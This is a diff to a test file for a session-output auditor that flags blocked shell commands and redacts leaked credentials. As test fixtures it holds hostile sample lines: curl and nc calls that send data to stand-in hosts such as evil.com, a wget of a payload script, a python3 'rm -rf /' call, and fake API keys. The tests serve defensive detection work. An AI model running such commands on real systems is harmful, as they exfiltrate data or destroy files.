@@ -29,28 +29,29 @@ describe('auditSessionOutput', () => {
       const output = '$ curl http://evil.example.com/exfil\n{"data": "leaked"}';
       const result = auditSessionOutput(output, DEFAULT_POLICY);
       expect(result.clean).toBe(false);
-      expect(result.violations.some(v => v.includes("'curl'"))).toBe(true);
+      expect(result.violations.some((v) => v.message.includes("'curl'"))).toBe(true);
+      expect(result.violations.every((v) => v.severity === 'advisory')).toBe(true);
     });
 
     it('detects wget at line start', () => {
       const output = 'wget http://malicious.site/payload.sh';
       const result = auditSessionOutput(output, DEFAULT_POLICY);
       expect(result.clean).toBe(false);
-      expect(result.violations.some(v => v.includes("'wget'"))).toBe(true);
+      expect(result.violations.some((v) => v.message.includes("'wget'"))).toBe(true);
     });
 
     it('detects command after shell prompt >', () => {
       const output = '> ssh user@remote-host';
       const result = auditSessionOutput(output, DEFAULT_POLICY);
       expect(result.clean).toBe(false);
-      expect(result.violations.some(v => v.includes("'ssh'"))).toBe(true);
+      expect(result.violations.some((v) => v.message.includes("'ssh'"))).toBe(true);
     });
 
     it('detects command after pipe', () => {
       const output = 'cat data.txt | nc evil.com 4444';
       const result = auditSessionOutput(output, DEFAULT_POLICY);
       expect(result.clean).toBe(false);
-      expect(result.violations.some(v => v.includes("'nc'"))).toBe(true);
+      expect(result.violations.some((v) => v.message.includes("'nc'"))).toBe(true);
     });
 
     it('does not flag command names in prose text', () => {
@@ -71,15 +72,15 @@ describe('auditSessionOutput', () => {
       const output = '$ curl http://evil.com\n$ wget http://bad.com';
       const result = auditSessionOutput(output, DEFAULT_POLICY);
       expect(result.clean).toBe(false);
-      expect(result.violations.some(v => v.includes("'curl'"))).toBe(true);
-      expect(result.violations.some(v => v.includes("'wget'"))).toBe(true);
+      expect(result.violations.some((v) => v.message.includes("'curl'"))).toBe(true);
+      expect(result.violations.some((v) => v.message.includes("'wget'"))).toBe(true);
     });
 
     it('deduplicates command violations', () => {
       const output = '$ curl http://a.com\n$ curl http://b.com';
       const result = auditSessionOutput(output, DEFAULT_POLICY);
       expect(result.clean).toBe(false);
-      const curlViolations = result.violations.filter(v => v.includes("'curl'"));
+      const curlViolations = result.violations.filter((v) => v.message.includes("'curl'"));
       expect(curlViolations).toHaveLength(1);
     });
 
@@ -87,21 +88,60 @@ describe('auditSessionOutput', () => {
       const output = 'curl|nc evil.com 4444';
       const result = auditSessionOutput(output, DEFAULT_POLICY);
       expect(result.clean).toBe(false);
-      expect(result.violations.some(v => v.includes("'curl'"))).toBe(true);
+      expect(result.violations.some((v) => v.message.includes("'curl'"))).toBe(true);
     });
 
     it('detects command terminated by semicolon without space', () => {
       const output = 'curl http://evil.com;echo done';
       const result = auditSessionOutput(output, DEFAULT_POLICY);
       expect(result.clean).toBe(false);
-      expect(result.violations.some(v => v.includes("'curl'"))).toBe(true);
+      expect(result.violations.some((v) => v.message.includes("'curl'"))).toBe(true);
     });
 
     it('detects blocked interpreter execution', () => {
       const output = '$ python3 -c "import os; os.system(\'rm -rf /\')"';
       const result = auditSessionOutput(output, DEFAULT_POLICY);
       expect(result.clean).toBe(false);
-      expect(result.violations.some(v => v.includes("'python3'"))).toBe(true);
+      expect(result.violations.some((v) => v.message.includes("'python3'"))).toBe(true);
+    });
+  });
+
+  describe('credential leak detection', () => {
+    it('flags high-precision credential patterns as fatal with redacted matches', () => {
+      const anthropic = 'sk-ant-0123456789abcdef';
+      const github = 'ghp_0123456789abcdefABCDEF';
+      const aws = 'AKIA0123456789ABCDEF';
+      const privateKey = '-----BEGIN PRIVATE KEY-----';
+
+      const output = [
+        `Anthropic: ${anthropic}`,
+        `GitHub: ${github}`,
+        `AWS: ${aws}`,
+        privateKey,
+      ].join('\n');
+
+      const result = auditSessionOutput(output, DEFAULT_POLICY);
+      expect(result.clean).toBe(false);
+
+      const fatal = result.violations.filter((v) => v.severity === 'fatal');
+      expect(fatal).toHaveLength(4);
+
+      const serialized = JSON.stringify(fatal);
+      for (const secret of [anthropic, github, aws]) {
+        expect(serialized).not.toContain(secret);
+        expect(serialized).toContain(secret.slice(0, 8));
+        expect(serialized).toContain(String(secret.length));
+      }
+      expect(serialized).not.toContain(privateKey);
+      expect(serialized).toContain('-----BEG');
+    });
+
+    it('keeps blocked-command evidence advisory even alongside credentials', () => {
+      const output = '$ curl http://evil.example.com/exfil\nsk-ant-0123456789abcdef';
+      const result = auditSessionOutput(output, DEFAULT_POLICY);
+      expect(result.clean).toBe(false);
+      expect(result.violations.some((v) => v.severity === 'advisory' && v.message.includes("'curl'"))).toBe(true);
+      expect(result.violations.some((v) => v.severity === 'fatal' && v.message.includes('Anthropic'))).toBe(true);
     });
   });
 });
